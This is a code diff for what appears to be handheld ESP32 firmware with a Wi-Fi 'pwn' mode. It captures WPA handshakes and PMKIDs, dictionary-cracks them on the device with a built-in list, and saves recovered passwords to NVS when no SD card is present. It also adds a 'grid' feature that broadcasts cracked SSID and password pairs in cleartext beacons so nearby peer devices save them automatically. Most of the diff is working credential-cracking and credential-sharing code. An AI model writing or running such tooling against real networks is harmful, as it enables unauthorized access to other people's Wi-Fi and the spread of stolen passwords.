@@ -27,6 +27,7 @@
 #include "wpa_crack.h"
 #include "mac_util.h"
 #include "wifi_sd_guard.h"
+#include "wifi_creds.h"       // wifiCredsSaveNvs — no-SD cracked-cred persistence (NVS "wifi")
 #ifdef BOARD_TDECK_PLUS
 #include "gps_manager.h"      // opportunistic geotag (Plus only, read-only if already running)
 #endif
@@ -42,6 +43,11 @@ extern DisplayManager displayManager;
 extern InputHandling  inputHandler;
 extern SDCardManager  sdCardManager;
 extern WiFiFunctions  wifiFunctions;
+
+// Session SD state, resolved once in runPwn(). false ⇒ RAM-only cardless run:
+// no .cap/backlog/progress, whitelist lives in RAM, captures crack in RAM off the
+// built-in list, and a cracked cred is saved to NVS ("wifi") instead of cracked.csv.
+static bool s_haveSd = true;
 
 // ── files under /apps/pwn ─────────────────────────────────────────────────────
 #define PWN_F_CRACKED   SD_DIR_PWN "/cracked.csv"     // time,bssid,ssid,password
@@ -310,6 +316,7 @@ static String wlNormalizeMac(const char* rest) {
     return String(out);
 }
 static void whitelistLoad() {
+    if (!s_haveSd) return;   // cardless: the RAM whitelist (from `pwn wl`) is the source; don't wipe it
     s_wlBssid.clear(); s_wlSsid.clear();
     File f = SD.open(PWN_F_WHITELIST, FILE_READ);
     if (!f) return;
@@ -346,11 +353,13 @@ static std::vector<String> s_sessionCaps;     // .cap paths written this session
 static std::vector<String> s_crackSkip;       // caps that returned -1 this session (solved / exhausted /
                                               // unparseable) — don't re-open them, so a wordlist that has
                                               // no password for a cap can't keep stealing time from hunting
-static int pwnCrackCap(const char* path, char* foundOut, size_t foundN, char* ssidOut, char* progOut) {
+static int pwnCrackCap(const char* path, char* foundOut, size_t foundN, char* ssidOut, char* progOut,
+                       uint8_t* bssidOut = nullptr) {
     if (progOut) progOut[0] = 0;
     capparse::CrackJob job; char err[64];
     if (!capparse::parseCap(path, job, err, sizeof(err))) return -1;
     if (ssidOut) strncpy(ssidOut, job.ssid, 33);
+    if (bssidOut) memcpy(bssidOut, job.apMac, 6);
     char cssid[33]; csvSsid(job.ssid, cssid, sizeof(cssid));   // ledger/log key (real ssid still used for crypto)
     if (crackedHas(job.apMac, cssid)) return -1;
 
@@ -490,12 +499,37 @@ struct __attribute__((packed)) GridAdv {
     char     name[12];
     uint16_t pwned, hs, pmkid, uptimeMin;
 };
+// A cracked-credential share (§12 v1.5): a deck that cracks a network broadcasts
+// SSID+PSK so the whole pack auto-saves it. Same offset-36 slot as GridAdv, told
+// apart by the inner magic ("ANQC" vs "ANQG"). PSK is cleartext over the pack's
+// private beacon — own-network use only; TX gated off in stealth like all grid TX.
+struct __attribute__((packed)) GridCred {
+    char     magic[4];   // "ANQC"
+    uint8_t  ver;
+    char     ssid[33];
+    char     psk[64];
+    uint8_t  bssid[6];
+};
 struct GridPeer { char name[13]; uint16_t pwned, hs; int8_t rssi; uint32_t lastSeenMs; };
 static GridPeer s_peer[PWN_MAX_PEERS];
 static int      s_nPeer = 0;
 static uint8_t  s_gridMac[6];
 static char     s_gridName[13];
 static char     s_metName[13];        // last newly-met peer (for the ticker)
+
+// Outbound cred share: set by pwnShareCred() on a local crack, broadcast on the next
+// few grid-TX ticks (redundant for lossy air), gated to active/passive in the loop.
+static char     s_shareSsid[33];
+static char     s_sharePsk[64];
+static uint8_t  s_shareBssid[6];
+static int      s_shareReps = 0;
+// Inbound cred (a peer's crack), staged by drainOne → persisted in the main loop
+// (SD/NVS writes can't happen in the drain hot path).
+static bool     s_credRxPending = false;
+static char     s_credRxSsid[33];
+static char     s_credRxPsk[64];
+static uint8_t  s_credRxBssid[6];
+static std::vector<String> s_gridLearned;   // SSIDs already learned from peers (dedup)
 
 static void gridInitIdentity() {      // grid MAC + auto name from the real STA MAC
     uint8_t base[6] = {0}; esp_wifi_get_mac(WIFI_IF_STA, base);
@@ -513,7 +547,9 @@ static void gridInitIdentity() {      // grid MAC + auto name from the real STA 
         f.close();
     }
 }
-static uint16_t gridBuildFrame(uint8_t* out, const GridAdv& a) {
+// Build a beacon-format grid frame carrying `payload` at offset 36 (PWN_GRID_ADV_OFF).
+// Shared by the advert (GridAdv) and the cred share (GridCred) — DRY.
+static uint16_t gridBuildFrameRaw(uint8_t* out, const void* payload, uint16_t plen) {
     uint16_t i = 0;
     out[i++] = 0x80; out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x00;   // FC beacon + dur
     for (int k = 0; k < 6; k++) out[i++] = 0xFF;                          // DA broadcast
@@ -522,8 +558,11 @@ static uint16_t gridBuildFrame(uint8_t* out, const GridAdv& a) {
     out[i++] = 0x00; out[i++] = 0x00;                                     // seq
     for (int k = 0; k < 8; k++) out[i++] = 0x00;                          // timestamp
     out[i++] = 0x64; out[i++] = 0x00; out[i++] = 0x01; out[i++] = 0x00;   // interval + cap  (i==36)
-    memcpy(out + i, &a, sizeof(GridAdv)); i += sizeof(GridAdv);
+    memcpy(out + i, payload, plen); i += plen;
     return i;
+}
+static uint16_t gridBuildFrame(uint8_t* out, const GridAdv& a) {
+    return gridBuildFrameRaw(out, &a, sizeof(GridAdv));
 }
 // Broadcast our advert. A peer's promiscuous RX only ever hears ITS OWN current channel, so
 // we SWEEP the advert across channels 1..PWN_GRID_SWEEP_HI — a peer roaming any channel then
@@ -547,6 +586,24 @@ static void gridSendAdv(uint16_t pwned, uint16_t hs, uint16_t pmkid, uint16_t up
     }
     esp_wifi_set_channel(roamCh, WIFI_SECOND_CHAN_NONE);   // back to the roam channel (before promiscuous resumes)
 }
+// Broadcast a cracked credential to the pack — same swept-channel path as the advert,
+// sent twice per call (lossy air). Caller gates on mode (never in stealth).
+static void gridSendCred(const char* ssid, const char* psk, const uint8_t* bssid, uint8_t roamCh) {
+    GridCred c; memset(&c, 0, sizeof(c));
+    memcpy(c.magic, "ANQC", 4); c.ver = 1;
+    strncpy(c.ssid, ssid, sizeof(c.ssid) - 1);
+    strncpy(c.psk,  psk,  sizeof(c.psk)  - 1);
+    memcpy(c.bssid, bssid, 6);
+    uint8_t fr[160]; uint16_t n = gridBuildFrameRaw(fr, &c, sizeof(c));
+    ScopedPromiscPause _;
+    for (int rep = 0; rep < 2; rep++)
+        for (uint8_t ch = 1; ch <= PWN_GRID_SWEEP_HI; ch++) {
+            if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
+            esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false);
+            vTaskDelay(pdMS_TO_TICKS(PWN_GRID_TX_GAP_MS));
+        }
+    esp_wifi_set_channel(roamCh, WIFI_SECOND_CHAN_NONE);
+}
 static bool gridPeerUpdate(const char* name, uint16_t pwned, uint16_t hs, int8_t rssi) {
     for (int i = 0; i < s_nPeer; i++)
         if (strncmp(s_peer[i].name, name, 12) == 0) {
@@ -558,6 +615,70 @@ static bool gridPeerUpdate(const char* name, uint16_t pwned, uint16_t hs, int8_t
     s_peer[s_nPeer].pwned = pwned; s_peer[s_nPeer].hs = hs; s_peer[s_nPeer].rssi = rssi;
     s_peer[s_nPeer].lastSeenMs = millis(); s_nPeer++;
     return true;                                              // newly met
+}
+
+// ── cardless single-HS RAM crack + cred persistence (§B/§C) ───────────────────
+// One crack job at a time, held in RAM (no .cap). Extracted from s_cap via
+// capparse::parseFrames; cracked in time-sliced passes off the built-in list +
+// any passwords already learned this session. Mirrors pwnCrackCap's crypto.
+static capparse::CrackJob s_ramJob;
+static bool     s_ramJobActive  = false;
+static uint8_t  s_ramJobBssid[6];
+static long     s_ramJobIdx     = 0;      // built-in list cursor
+static bool     s_ramJobPriDone = false;  // tried session priors yet?
+static std::vector<String> s_ramPriors;   // passwords cracked this session (reuse across targets)
+
+// Persist a cracked credential: no SD → NVS "wifi" (connectable, read by sw/cw);
+// SD → pwn's cracked.csv log. Also remembers it as a session prior. Returns true
+// if it reached durable storage.
+static bool pwnPersistCred(const uint8_t* bssid, const char* ssid, const char* pw) {
+    bool dup = false;
+    for (auto& p : s_ramPriors) if (p == pw) { dup = true; break; }
+    if (!dup) s_ramPriors.push_back(String(pw));
+    if (s_haveSd) { crackedAppend(bssid, ssid, pw); return true; }   // opens its own ScopedPromiscPause
+    ScopedPromiscPause _;
+    return wifiCredsSaveNvs(String(ssid), String(pw));              // false if SSID > 15 chars (NVS key cap)
+}
+// Queue a cracked cred for grid broadcast (sent on the next few grid-TX ticks,
+// gated to active/passive in the loop).
+static void pwnShareCred(const uint8_t* bssid, const char* ssid, const char* pw) {
+    strncpy(s_shareSsid, ssid, sizeof(s_shareSsid) - 1); s_shareSsid[sizeof(s_shareSsid) - 1] = 0;
+    strncpy(s_sharePsk,  pw,   sizeof(s_sharePsk)  - 1); s_sharePsk[sizeof(s_sharePsk)  - 1] = 0;
+    memcpy(s_shareBssid, bssid, 6);
+    s_shareReps = 3;
+}
+// Run one time-sliced pass of the RAM crack. Returns 1 hit (foundOut set), 0 more
+// to go, -1 exhausted (not in the built-in list).
+static int pwnRamCrackSlice(char* foundOut, size_t foundN) {
+    if (!s_ramJobActive) return -1;
+    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
+    mbedtls_md_context_t ctx; mbedtls_md_init(&ctx); mbedtls_md_setup(&ctx, sha1, 1);
+    auto tryPw = [&](const char* pw) -> bool {
+        return s_ramJob.haveHs
+            ? wpacrack::verifyHandshake(pw, s_ramJob.ssid, s_ramJob.apMac, s_ramJob.staMac,
+                                        s_ramJob.anonce, s_ramJob.snonce, s_ramJob.eapol,
+                                        s_ramJob.eapolLen, s_ramJob.mic, &ctx, sha1)
+            : wpacrack::verifyPMKID(pw, s_ramJob.ssid, s_ramJob.apMac, s_ramJob.staMac,
+                                    s_ramJob.pmkid, &ctx, sha1);
+    };
+    int result = 0;
+    if (!s_ramJobPriDone) {                         // session priors first (short list, do all)
+        for (auto& pw : s_ramPriors)
+            if (tryPw(pw.c_str())) { strncpy(foundOut, pw.c_str(), foundN - 1); result = 1; break; }
+        s_ramJobPriDone = true;
+    }
+    if (!result) {
+        uint32_t t0 = millis();
+        while (s_ramJobIdx < (long)wpacrack::kBuiltinCount && millis() - t0 < PWN_CRACK_SLICE_MS) {
+            if (tryPw(wpacrack::kBuiltins[s_ramJobIdx])) {
+                strncpy(foundOut, wpacrack::kBuiltins[s_ramJobIdx], foundN - 1); result = 1; break;
+            }
+            s_ramJobIdx++;
+        }
+    }
+    mbedtls_md_free(&ctx);
+    if (result) return 1;
+    return (s_ramJobIdx >= (long)wpacrack::kBuiltinCount) ? -1 : 0;
 }
 
 // opportunistic geotag — only reads GPS if the task is ALREADY running (never starts
@@ -585,6 +706,23 @@ static void flushCapture(int8_t rssi, uint8_t ch) {
     bool isHs = s_cap.haveM2;
     bool isPmkid = s_cap.m1HasPmkid;
     if (!isHs && !isPmkid) return;                 // nothing crackable yet
+
+    if (!s_haveSd) {
+        // Cardless: no .cap. Stash ONE RAM crack job (one HS at a time); if the slot
+        // is busy, drop this capture (leave the target un-captured so it re-caught later).
+        if (!s_ramJobActive) {
+            capparse::CrackJob job;
+            if (capparse::parseFrames(s_cap.ssid, s_cap.m1, s_cap.m1Len,
+                                      isHs ? s_cap.m2 : nullptr, s_cap.m2Len, job)) {
+                s_ramJob = job; s_ramJobActive = true; s_ramJobIdx = 0; s_ramJobPriDone = false;
+                memcpy(s_ramJobBssid, s_cap.bssid, 6);
+                PwnTarget* t2 = targFind(s_cap.bssid);      // out of the prey list; crack decides final fate
+                if (t2) t2->captured = true;
+            }
+        }
+        s_cap.active = false; s_cap.haveM1 = s_cap.haveM2 = s_cap.m1HasPmkid = false;
+        return;
+    }
 
     char path[96]; capPath(s_cap.bssid, s_cap.ssid, path, sizeof(path));
     { ScopedPromiscPause _;
@@ -634,14 +772,31 @@ static char drainOne(uint8_t curCh) {
         if (t) t->wl = whitelisted(b, ssid);
         return 'B';
     }
-    if (fr.kind == 3) {                                 // AL-ANQA grid advert from a peer
-        if (fr.len < PWN_GRID_ADV_OFF + (int)sizeof(GridAdv)) return 0;
+    if (fr.kind == 3) {                                 // AL-ANQA grid frame from a peer
         if (memcmp(fr.data + 10, s_gridMac, 6) == 0) return 0;   // our own broadcast — ignore
-        GridAdv a; memcpy(&a, fr.data + PWN_GRID_ADV_OFF, sizeof(a));
-        if (memcmp(a.magic, "ANQG", 4) != 0) return 0;
-        char nm[13]; strncpy(nm, a.name, 12); nm[12] = 0;
-        bool isNew = gridPeerUpdate(nm, a.pwned, a.hs, fr.rssi);
-        if (isNew) { strncpy(s_metName, nm, sizeof(s_metName) - 1); s_metName[12] = 0; return 'G'; }
+        if (fr.len < PWN_GRID_ADV_OFF + 5) return 0;
+        const uint8_t* pl = fr.data + PWN_GRID_ADV_OFF;
+        if (memcmp(pl, "ANQG", 4) == 0) {               // peer advert (stats)
+            if (fr.len < PWN_GRID_ADV_OFF + (int)sizeof(GridAdv)) return 0;
+            GridAdv a; memcpy(&a, pl, sizeof(a));
+            char nm[13]; strncpy(nm, a.name, 12); nm[12] = 0;
+            bool isNew = gridPeerUpdate(nm, a.pwned, a.hs, fr.rssi);
+            if (isNew) { strncpy(s_metName, nm, sizeof(s_metName) - 1); s_metName[12] = 0; return 'G'; }
+            return 0;
+        }
+        if (memcmp(pl, "ANQC", 4) == 0) {               // peer shared a cracked credential
+            if (fr.len < PWN_GRID_ADV_OFF + (int)sizeof(GridCred)) return 0;
+            if (s_credRxPending) return 0;              // a prior cred not yet persisted — wait
+            GridCred c; memcpy(&c, pl, sizeof(c));
+            c.ssid[sizeof(c.ssid) - 1] = 0; c.psk[sizeof(c.psk) - 1] = 0;
+            if (!c.ssid[0]) return 0;
+            for (auto& s : s_gridLearned) if (s == c.ssid) return 0;   // already learned
+            strncpy(s_credRxSsid, c.ssid, sizeof(s_credRxSsid) - 1); s_credRxSsid[sizeof(s_credRxSsid) - 1] = 0;
+            strncpy(s_credRxPsk,  c.psk,  sizeof(s_credRxPsk)  - 1); s_credRxPsk[sizeof(s_credRxPsk)  - 1] = 0;
+            memcpy(s_credRxBssid, c.bssid, 6);
+            s_credRxPending = true;                     // main loop persists it (SD/NVS off the hot path)
+            return 'C';
+        }
         return 0;
     }
     if (fr.kind == 2) {                                 // data frame → learn a client STA
@@ -1067,7 +1222,9 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         dm.setTextColor(PH_DIM);   dm.printText("::");
         dm.setTextColor(PH_AMBER); dm.printText(modeName(mode));
         dm.setTextColor(PH_DIM);   dm.printText("]  ");
-        dm.setTextColor(0x07FF);   dm.println(s_gridName);   // this device's own grid name
+        dm.setTextColor(0x07FF);   dm.printText(s_gridName);   // this device's own grid name
+        if (!s_haveSd) { dm.setTextColor(PH_AMBER); dm.printText("  NO-SD"); }  // RAM crack + NVS save
+        dm.println("");
         tft.fillRect(4, BOX_Y - 4, SCREEN_WIDTH - 8, 2, PH_MAROON);
     };
     drawChrome();
@@ -1182,6 +1339,16 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         else if (ev == '2') { s_m2Seen++; strcpy(mood, "EXCITED"); lastMoodEvt = now; }
         else if (ev == 'G') { strcpy(mood, "SOCIAL"); lastMoodEvt = now;   // met a grid peer
                               snprintf(ticker, sizeof(ticker), "met %.12s", s_metName); }
+        else if (ev == 'C') { strcpy(mood, "SOCIAL"); lastMoodEvt = now;   // a peer shared a crack
+                              snprintf(ticker, sizeof(ticker), "learned %.12s", s_credRxSsid); }
+
+        // Persist a credential a peer shared over the grid (staged by drainOne; SD/NVS write
+        // kept off the drain hot path). Same routing as our own cracks: no SD → NVS, SD → csv.
+        if (s_credRxPending) {
+            pwnPersistCred(s_credRxBssid, s_credRxSsid, s_credRxPsk);
+            s_gridLearned.push_back(String(s_credRxSsid));
+            s_credRxPending = false;
+        }
 
         // grid broadcast (active + passive only; stealth stays dark). RX runs in every mode.
         // The advert TX sweeps all channels then restores curCh, so peers rendezvous regardless
@@ -1189,6 +1356,10 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         if (mode != PWN_STEALTH && now >= gridTxAt) {
             gridTxAt = now + PWN_GRID_TX_MS;
             gridSendAdv(pwnedCount, hsCount, pmCount, (uint16_t)((now - t0Session) / 60000), curCh);
+            if (s_shareReps > 0) {                       // re-broadcast a fresh local crack (lossy air)
+                gridSendCred(s_shareSsid, s_sharePsk, s_shareBssid, curCh);
+                s_shareReps--;
+            }
         }
         // expire peers not heard from in a while
         for (int i = 0; i < s_nPeer; )
@@ -1196,8 +1367,8 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             else i++;
 
         // periodic checkpoint of the learned table (every 2 min) so a crash / power-off
-        // can't cost a session — GDMA-safe (learnSave pauses promiscuous internally).
-        if (s_aiOn) {
+        // can't cost a session — GDMA-safe (learnSave pauses promiscuous internally). SD only.
+        if (s_aiOn && s_haveSd) {
             if (learnSaveAt == 0) learnSaveAt = now + 120000;
             else if (now >= learnSaveAt) { learnSave(); learnSaveAt = now + 120000; }
         }
@@ -1207,8 +1378,9 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             bool wasHs = s_cap.haveM2;
             PwnTarget* tt = targFind(s_cap.bssid);
             flushCapture(tt ? tt->rssi : 0, tt ? tt->ch : curCh);
-            if (wasHs) { hsCount++; snprintf(ticker, sizeof(ticker), "+HS %.24s", s_lastSaveFile + sizeof(SD_DIR_PWN)); }
-            else       { pmCount++; snprintf(ticker, sizeof(ticker), "+PMKID captured"); }
+            if (wasHs) { hsCount++; snprintf(ticker, sizeof(ticker), "+HS %.24s",
+                                             s_haveSd ? s_lastSaveFile + sizeof(SD_DIR_PWN) : "cracking..."); }
+            else       { pmCount++; snprintf(ticker, sizeof(ticker), "+PMKID %s", s_haveSd ? "captured" : "cracking..."); }
             strcpy(mood, "EXCITED"); lastMoodEvt = now; curReward += 10.0f;   // capture = the payoff
             hotChan = 0; hotUntil = 0;   // got it — release the hot-hold and move on
         }
@@ -1234,7 +1406,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         // DISCOVERING the environment. Cracking pauses promiscuous, so we must actually
         // listen before concluding "nothing to capture" — else a fresh session goes deaf on
         // its backlog instead of finding the APs around it (12s ≈ one 1/6/11 sweep).
-        bool canCrack = !captureWork && (now - lastM1Ms) > 1200 && (now - t0Session) > 12000;
+        bool canCrack = s_haveSd && !captureWork && (now - lastM1Ms) > 1200 && (now - t0Session) > 12000;
         if (canCrack && now >= crackAt) {
             bool didWork = false;
             {   // GDMA (fix #2): a crack batch reads the SD (dir list, .cap, wordlist) and
@@ -1264,12 +1436,13 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
                     bool skip = false;                          // already solved/exhausted this session?
                     for (auto& s : s_crackSkip) if (s == cp) { skip = true; break; }
                     if (skip) continue;
-                    char found[64] = {0}, ss[33] = {0}, prog[16] = {0};
-                    int r = pwnCrackCap(cp.c_str(), found, sizeof(found), ss, prog);
+                    char found[64] = {0}, ss[33] = {0}, prog[16] = {0}; uint8_t cbss[6] = {0};
+                    int r = pwnCrackCap(cp.c_str(), found, sizeof(found), ss, prog, cbss);
                     if (r == -1) { s_crackSkip.push_back(cp); continue; }   // nothing more here — never retry
                     didWork = true;
                     if (r == 1) { pwnedCount++; strcpy(mood, "PWNED"); pwnFlash = now + 2500;
-                        snprintf(ticker, sizeof(ticker), "PWNED %.14s=%.10s", ss, found); }
+                        snprintf(ticker, sizeof(ticker), "PWNED %.14s=%.10s", ss, found);
+                        pwnShareCred(cbss, ss, found); }                    // tell the pack (TX gated on mode)
                     else { strcpy(mood, "CRACK");
                         snprintf(ticker, sizeof(ticker), "crack %.14s  %s", ss[0] ? ss : cp.c_str() + sizeof(SD_DIR_PWN), prog); }
                     lastMoodEvt = now;
@@ -1280,6 +1453,30 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             // air first); back off hard once the whole backlog is solved/exhausted so we don't
             // re-scan the SD every loop (spin guard).
             crackAt = now + (didWork ? 0 : 12000);
+        }
+
+        // Cardless RAM crack: no .cap backlog — crack the single stashed job off the built-in
+        // list in short slices. Runs opportunistically (even with prey around, since the slot
+        // holds only one HS and the slice is short); PWNED → NVS save + grid share.
+        if (!s_haveSd && s_ramJobActive && (now - lastM1Ms) > 800 && now >= crackAt) {
+            char found[64] = {0}; int r;
+            { ScopedPromiscPause _; r = pwnRamCrackSlice(found, sizeof(found)); }
+            if (r == 1) {
+                pwnedCount++; strcpy(mood, "PWNED"); pwnFlash = now + 2500;
+                snprintf(ticker, sizeof(ticker), "PWNED %.14s=%.10s", s_ramJob.ssid, found);
+                pwnPersistCred(s_ramJobBssid, s_ramJob.ssid, found);   // → NVS "wifi"
+                pwnShareCred(s_ramJobBssid, s_ramJob.ssid, found);     // tell the pack
+                s_ramJobActive = false; lastMoodEvt = now; crackAt = now;
+            } else if (r == -1) {
+                strcpy(mood, "HUNT");
+                snprintf(ticker, sizeof(ticker), "%.14s not in list", s_ramJob.ssid);
+                s_ramJobActive = false; lastMoodEvt = now; crackAt = now + 3000;
+            } else {
+                strcpy(mood, "CRACK");
+                snprintf(ticker, sizeof(ticker), "crack %.14s  %ld/%d", s_ramJob.ssid,
+                         s_ramJobIdx, (int)wpacrack::kBuiltinCount);
+                lastMoodEvt = now; crackAt = now;
+            }
         }
 
         // resting mood after a quiet stretch: HUNT while un-captured prey is in range
@@ -1326,10 +1523,9 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
                 if (fullChans) { setNn = 13; for (int i = 0; i < 13; i++) setA[i] = i + 1; }
                 else           { setNn = (int)sizeof(PWN_CHANS); for (int i = 0; i < setNn; i++) setA[i] = PWN_CHANS[i]; }
                 uint8_t fav = learnFavorite(setA, setNn);
-                snprintf(l, sizeof(l), "c%-2u AI>c%-2u  ", curCh, fav);
+                snprintf(l, sizeof(l), "c%-2u AI>c%-2u g%-2d", curCh, fav, s_nPeer);   // g = grid peers
             }
-            else if (s_nPeer > 0) snprintf(l, sizeof(l), "%-7s ch%-2u g%d", modeName(mode), curCh, s_nPeer);
-            else                  snprintf(l, sizeof(l), "%-7s ch%-2u    ", modeName(mode), curCh);
+            else snprintf(l, sizeof(l), "%-7s ch%-2u g%-2d", modeName(mode), curCh, s_nPeer);
             tft.print(l);
             tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 40); tft.print("SIGNAL");
             for (int i = 0; i < 4; i++) tft.fillRect(RX + i * 14, BOX_Y + 52, 11, 13, i < bars ? TFT_GREEN : PH_ASHDK);
@@ -1386,7 +1582,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
-    if (s_aiOn) learnSave();   // persist the learned channel table (radio fully idle now)
+    if (s_aiOn && s_haveSd) learnSave();   // persist the learned channel table (radio fully idle now; SD only)
     if (haveSpr) phx.deleteSprite();
     dm.clearScreen();
     dm.printCommandScreen();
@@ -1396,8 +1592,18 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
 static void wlList(DisplayManager& dm) {
     dm.clearScreen(); dm.setCursor(4, outputY);
     dm.setTextColor(TFT_CYAN); dm.println("[PWN WHITELIST]"); dm.printSeparator();
-    File f = SD.open(PWN_F_WHITELIST, FILE_READ);
     int n = 0;
+    if (!s_haveSd) {                                     // cardless: render the RAM whitelist
+        for (auto& b : s_wlBssid) { dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
+            char r[46]; snprintf(r, sizeof(r), "[%d] bssid,%.30s", n, b.c_str()); dm.println(r); n++; }
+        for (auto& s : s_wlSsid)  { dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
+            char r[46]; snprintf(r, sizeof(r), "[%d] ssid,%.30s", n, s.c_str()); dm.println(r); n++; }
+        if (!n) { dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF); dm.println("(empty)"); }
+        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(PH_AMBER);
+        dm.println("RAM only (no SD) - clears on reboot");
+        dm.printCommandScreen(); return;
+    }
+    File f = SD.open(PWN_F_WHITELIST, FILE_READ);
     if (f) {
         while (f.available()) {
             String ln = f.readStringUntil('\n'); ln.trim();
@@ -1411,6 +1617,11 @@ static void wlList(DisplayManager& dm) {
     dm.printCommandScreen();
 }
 static void wlAppend(const char* type, const char* value, const char* label) {
+    if (!s_haveSd) {                                     // cardless: session-only RAM whitelist
+        if (!strcmp(type, "bssid")) { String m = wlNormalizeMac(value); if (m.length()) s_wlBssid.push_back(m); }
+        else if (!strcmp(type, "ssid")) { String n(value); n.trim(); if (n.length()) s_wlSsid.push_back(n); }
+        return;
+    }
     sdCardManager.ensureDir(SD_DIR_PWN);
     File f = SD.open(PWN_F_WHITELIST, FILE_APPEND);
     if (!f) return;
@@ -1420,12 +1631,11 @@ static void wlAppend(const char* type, const char* value, const char* label) {
 
 void runPwn(char* args) {
     DisplayManager& dm = displayManager;
-    if (!sdCardManager.canAccessSD()) {
-        dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_RED);
-        dm.println("No SD — pwn needs SD for captures."); dm.setTextColor(TFT_WHITE);
-        dm.printCommandScreen(); return;
-    }
-    sdCardManager.ensureDir(SD_DIR_PWN);
+    // No SD is no longer fatal — pwn degrades to a RAM-only run: capture + crack one HS
+    // at a time off the built-in list, save cracked creds to NVS, whitelist lives in RAM,
+    // and the grid still works fully. Only .cap/backlog/persistence are skipped.
+    s_haveSd = sdCardManager.canAccessSD();
+    if (s_haveSd) sdCardManager.ensureDir(SD_DIR_PWN);
 
     char buf[128]; buf[0] = 0;
     if (args) { strncpy(buf, args, sizeof(buf) - 1); }
@@ -1435,7 +1645,11 @@ void runPwn(char* args) {
     if (tok && (!strcmp(tok, "wl") || !strcmp(tok, "whitelist"))) {
         char* sub = strtok(nullptr, " ");
         if (!sub || !strcmp(sub, "list")) { wlList(dm); return; }
-        if (!strcmp(sub, "clear")) { SD.remove(PWN_F_WHITELIST); wlList(dm); return; }
+        if (!strcmp(sub, "clear")) {
+            if (!s_haveSd) { s_wlBssid.clear(); s_wlSsid.clear(); }
+            else SD.remove(PWN_F_WHITELIST);
+            wlList(dm); return;
+        }
         if (!strcmp(sub, "add")) {
             char* a1 = strtok(nullptr, " ");
             if (!a1) { dm.println("usage: pwn wl add <idx|bssid>|ssid <name>"); dm.printCommandScreen(); return; }
@@ -1466,6 +1680,12 @@ void runPwn(char* args) {
         }
         if (!strcmp(sub, "rm")) {
             char* a1 = strtok(nullptr, " "); int target = a1 ? atoi(a1) : -1;
+            if (!s_haveSd) {                            // cardless: erase from the RAM vectors
+                int nb = (int)s_wlBssid.size();         // list order = bssid rows, then ssid rows
+                if (target >= 0 && target < nb) s_wlBssid.erase(s_wlBssid.begin() + target);
+                else if (target >= nb && target - nb < (int)s_wlSsid.size()) s_wlSsid.erase(s_wlSsid.begin() + (target - nb));
+                wlList(dm); return;
+            }
             // rewrite file without row #target
             File f = SD.open(PWN_F_WHITELIST, FILE_READ);
             std::vector<String> keep; int n = 0;
